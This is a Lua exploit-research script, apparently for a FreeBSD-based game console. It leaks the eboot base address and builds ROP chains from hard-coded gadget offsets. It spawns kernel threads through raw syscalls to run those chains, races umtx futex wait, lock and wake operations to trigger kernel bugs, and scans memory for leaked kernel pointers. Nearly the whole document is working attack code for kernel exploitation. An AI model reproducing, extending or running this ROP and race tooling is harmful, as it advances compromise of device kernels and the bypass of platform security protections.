-- CRASH_CLASS: HIGH
-- PROBE 80r: UMTX WAIT/WAKE race — thread toggles ownership during wait
--
-- 80q showed TRYLOCK/UNLOCK are atomic (CAS-based, no race window).
-- MUTEX_WAIT(2) has a longer code path: it must:
--   1. copyin futex word
--   2. check if owner matches expected
--   3. insert into umtxq sleep queue
--   4. call umtxq_sleep (schedule away)
--
-- If the thread changes the futex owner between steps 1-2 and 3-4,
-- the kernel may enter the sleep queue for a now-changed owner.
-- When the owner changes again, the wakeup may not find the sleeper.
--
-- More interesting: use UMTX_OP_WAIT(0) instead of MUTEX ops.
-- UMTX_OP_WAIT checks *obj == val, then sleeps. If thread changes
-- *obj between the check and sleep, we race the condition variable.
--
-- Also test: PI (priority inheritance) mutex ops which have more
-- complex kernel paths with turnstile operations.

print("=== PROBE 80r: UMTX WAIT/WAKE RACE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function zero(buf, n)
    for off = 0, n - 4, 4 do wd(buf + off, 0) end
end

syscall.resolve({ sc_getpid = 20 })
local pid = syscall.sc_getpid():tonumber()
print("[*] pid=" .. pid)

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eboot = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
print("[*] eboot=" .. q(eboot))

local pop_rdi_ret   = eboot + 0xC9DFE
local pop_rax_ret   = eboot + 0x992
local mov_rdi_eax   = eboot + 0x92C68
local push_rax_ret  = eboot + 0x962

local sc_mmap = make_syscall(477)
local sc_umtx = make_syscall(454)

-- Shared futex in GPU mmap
local ok_f, futex_page = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(futex_page, 128)

local marker = memory.alloc(16)
zero(marker, 16)

-- =================================================================
-- SECTION A: PI MUTEX ops — priority inheritance has complex turnstile path
-- UMTX_OP_MUTEX_TRYLOCK with UMTX_PRIO_INHERIT flag
-- =================================================================
print("")
print("=== [A] PI MUTEX OPS ===")

-- Try PI mutex: in FreeBSD, the flags are in the mutex word itself
-- UMTX_MTX_CONTESTED = 0x80000000
-- PI mutexes use different kernel paths with turnstile operations

-- First test: basic PI mutex trylock
-- FreeBSD PI mutex: op=17 (UMTX_OP_MUTEX_LOCK_PI) -- UNDOCUMENTED?
-- Actually FreeBSD has: UMTX_OP_MUTEX_TRYLOCK=5 (handles PI via flags)
-- UMTX_OP_PI_LOCK=17 was removed. In FreeBSD 11:
-- op 17 = UMTX_OP_PP_SET_CEILING (priority protect)

-- Sweep non-blocking ops only (skip known WAIT variants that block)
-- From 80p: ops 2,3,5,6,21 work. op 9,10 work (semaphore).
-- Skip: 0(WAIT blocks), 11-16 may block
print("[A] Scanning UMTX ops 7-30 (non-blocking only)...")
-- Skip all known/suspected blocking ops
local skip_ops = {[0]=true, [2]=true, [7]=true, [8]=true, [11]=true, [12]=true, [13]=true, [14]=true, [15]=true, [16]=true, [22]=true, [23]=true}
for op = 7, 30 do
    if not skip_ops[op] then
        zero(futex_page, 16)
        local ok_op, rv_op = pcall(function()
            return sc_umtx(uint64(futex_page), uint64(op), uint64(0), uint64(0), uint64(0))
        end)
        local rv_n = -999
        if ok_op then rv_n = to_num(rv_op) end
        local fval = rd(futex_page) or 0
        if rv_n == 0 or (rv_n ~= -1 and rv_n ~= -999 and rv_n ~= 0xFFFFFFFF) then
            print(string.format("  op=%d: rv=%d futex=0x%X ***", op, rv_n, fval))
        end
    end
end

-- =================================================================
-- SECTION B: UMTX_OP_WAIT(0) race — thread toggles value during wait
-- Thread writes matching value → kernel sees match → enters sleep
-- Thread immediately writes non-matching → kernel should NOT have slept
-- But if it did sleep, it's stuck (no waker for changed value)
-- Use short timeout so we don't actually block
-- =================================================================
print("")
print("=== [B] UMTX_OP_WAIT RACE ===")

-- Thread: toggle futex between 42 and 99
local ok_st, stack1 = pcall(function()
    return sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

local idx = 0
local function push(val)
    wq(stack1 + (idx * 8), val)
    idx = idx + 1
end

-- Write marker first
push(marker)
push(pop_rax_ret)
push(uint64(0xDEADBEEF))
push(mov_rdi_eax)

-- Toggle futex: 42 → 99 → 42 → 99 ...
for cycle = 1, 300 do
    push(pop_rdi_ret)
    push(futex_page)
    push(pop_rax_ret)
    push(uint64(42))
    push(mov_rdi_eax)

    push(pop_rdi_ret)
    push(futex_page)
    push(pop_rax_ret)
    push(uint64(99))
    push(mov_rdi_eax)

    if cycle % 100 == 0 then
        print("[*] chain: " .. idx .. " slots...")
    end
end

-- Infinite loop
push(pop_rax_ret)
push(push_rax_ret)
push(push_rax_ret)

print("[*] thread chain: " .. idx .. " slots")

local ctx = memory.alloc(0x600)
zero(ctx, 0x600)
pcall(function() make_syscall(421)(uint64(ctx)) end)
wq(ctx + 0xE0, pop_rdi_ret)
wq(ctx + 0xF8, stack1)

local tid1 = memory.alloc(8)
zero(tid1, 8)

print("[*] spawning toggler...")
local ok1, rv1 = pcall(function()
    return make_syscall(430)(uint64(ctx), uint64(tid1), uint64(0))
end)
print("T1=" .. tostring(rv1) .. " ok=" .. tostring(ok1) .. " marker=" .. string.format("0x%08X", rd(marker) or 0))

if rd(marker) ~= 0xDEADBEEF then
    print("[!] thread failed")
    print("=== PROBE 80r INCOMPLETE ===")
    return
end

-- Timeout struct: 0 seconds, 100 nanoseconds (near-instant wakeup)
local ts = memory.alloc(32)
zero(ts, 32)
wd(ts, 0)       -- tv_sec = 0
wd(ts + 8, 100) -- tv_nsec = 100

-- Race: call UMTX_OP_WAIT(0) with val=42 while thread toggles
-- If futex==42 when copyin happens, kernel enters wait path
-- Thread then changes to 99, but kernel already committed to waiting
local wait_matched = 0
local wait_timeout = 0
local wait_mismatch = 0
local wait_anom = 0

for i = 1, 500 do
    -- WAIT: obj=futex, op=0, val=42, uaddr1=timeout, uaddr2=sizeof(ts)
    local ok_w, rv_w = pcall(function()
        return sc_umtx(uint64(futex_page), uint64(0), uint64(42),
            uint64(ts), uint64(16))
    end)

    if ok_w then
        local rv_n = to_num(rv_w)
        if rv_n == 0 then
            -- Woke up normally (someone woke us, or spurious)
            wait_matched = wait_matched + 1
        elseif rv_n == 0xFFFFFFFF then
            -- EAGAIN (value didn't match) or ETIMEDOUT
            wait_mismatch = wait_mismatch + 1
        else
            wait_anom = wait_anom + 1
            if wait_anom <= 5 then
                print(string.format("[!] WAIT anom i=%d rv=0x%X futex=%d",
                    i, rv_n, rd(futex_page) or -1))
            end
        end
    else
        wait_anom = wait_anom + 1
    end
end

print(string.format("[B] WAIT: matched=%d mismatch=%d anom=%d", wait_matched, wait_mismatch, wait_anom))

-- =================================================================
-- SECTION C: Rapid LOCK/UNLOCK with WAKE interleaved
-- Thread 2: toggles futex with CONTESTED flag
-- Main: TRYLOCK → WAKE → UNLOCK cycle to stress kernel queue
-- =================================================================
print("")
print("=== [C] LOCK/WAKE/UNLOCK STRESS ===")

-- Reuse thread 1 (still looping), spawn thread 2 for contested toggle
local ok_st2, stack2 = pcall(function()
    return sc_mmap(uint64(0), uint64(8 * 0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)

-- Get thread 1's TID for contested value
local t1_tid = 0
local t1q = rq(tid1)
if t1q then
    if type(t1q) == "table" and t1q.l then t1_tid = t1q.l else t1_tid = to_num(t1q) end
end
local contested = 0x80000000 + (t1_tid % 0x10000)

local idx2 = 0
local function push2(val)
    wq(stack2 + (idx2 * 8), val)
    idx2 = idx2 + 1
end

-- Thread 2: write contested → our_pid → 0 → contested cycle
-- Using main thread's PID as owner creates "owned by us" confusion
for cycle = 1, 200 do
    if cycle == 1 then
        push2(futex_page)
    else
        push2(pop_rdi_ret)
        push2(futex_page)
    end
    push2(pop_rax_ret)
    push2(uint64(contested))
    push2(mov_rdi_eax)

    push2(pop_rdi_ret)
    push2(futex_page)
    push2(pop_rax_ret)
    push2(uint64(pid))     -- main thread's PID as fake owner
    push2(mov_rdi_eax)

    push2(pop_rdi_ret)
    push2(futex_page)
    push2(pop_rax_ret)
    push2(uint64(0))
    push2(mov_rdi_eax)
end

push2(pop_rax_ret)
push2(push_rax_ret)
push2(push_rax_ret)

print("[*] thread2 chain: " .. idx2 .. " slots")

local ctx2 = memory.alloc(0x600)
zero(ctx2, 0x600)
pcall(function() make_syscall(421)(uint64(ctx2)) end)
wq(ctx2 + 0xE0, pop_rdi_ret)
wq(ctx2 + 0xF8, stack2)

local tid2 = memory.alloc(8)
zero(tid2, 8)

print("[*] spawning thread 2...")
local ok2, rv2 = pcall(function()
    return make_syscall(430)(uint64(ctx2), uint64(tid2), uint64(0))
end)
print("T2=" .. tostring(rv2) .. " ok=" .. tostring(ok2))

-- Stress: TRYLOCK → WAKE → UNLOCK rapid cycle
local stress_ok = 0
local stress_fail = 0
local stress_anom = 0
local stress_crash = 0

for i = 1, 500 do
    -- TRYLOCK
    local ok_l, rv_l = pcall(function()
        return sc_umtx(uint64(futex_page), uint64(5), uint64(0), uint64(0), uint64(0))
    end)

    if ok_l and to_num(rv_l) == 0 then
        -- Got lock. WAKE any waiters (val = wake count)
        pcall(function()
            sc_umtx(uint64(futex_page), uint64(3), uint64(0x7FFFFFFF), uint64(0), uint64(0))
        end)

        -- UNLOCK
        local ok_u, rv_u = pcall(function()
            return sc_umtx(uint64(futex_page), uint64(6), uint64(0), uint64(0), uint64(0))
        end)

        if ok_u then
            local rv_u_n = to_num(rv_u)
            if rv_u_n == 0 then
                stress_ok = stress_ok + 1
            else
                stress_anom = stress_anom + 1
                if stress_anom <= 3 then
                    print(string.format("[!] unlock anom i=%d rv=0x%X futex=0x%X",
                        i, rv_u_n, rd(futex_page) or 0))
                end
            end
        else
            stress_crash = stress_crash + 1
        end
    elseif ok_l then
        stress_fail = stress_fail + 1
    else
        stress_crash = stress_crash + 1
    end
end

print(string.format("[C] stress: ok=%d fail=%d anom=%d crash=%d",
    stress_ok, stress_fail, stress_anom, stress_crash))

-- =================================================================
-- SECTION D: Scan kernel pointer leakage from futex metadata
-- After all the racing, scan nearby memory for kernel pointers
-- that might have been written by confused kernel paths
-- =================================================================
print("")
print("=== [D] POST-RACE MEMORY SCAN ===")

local kptrs = 0
-- Scan futex page and surrounding area
for off = 0, 0x1000 - 8, 8 do
    local v = rq(futex_page + off)
    if v then
        local h = 0
        if type(v) == "table" and v.h then h = v.h end
        if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
            kptrs = kptrs + 1
            if kptrs <= 5 then
                print(string.format("[!!!] KPTR futex+0x%X: %s", off, q(v)))
            end
        end
    end
end

print(string.format("[D] kernel pointers found: %d", kptrs))
if kptrs > 0 then
    print("[D] *** KERNEL POINTER LEAK FROM MUTEX RACE ***")
end

local alive = pcall(function() return syscall.sc_getpid():tonumber() end)
print("")
print("[*] alive=" .. tostring(alive))
print("=== PROBE 80r COMPLETE ===")
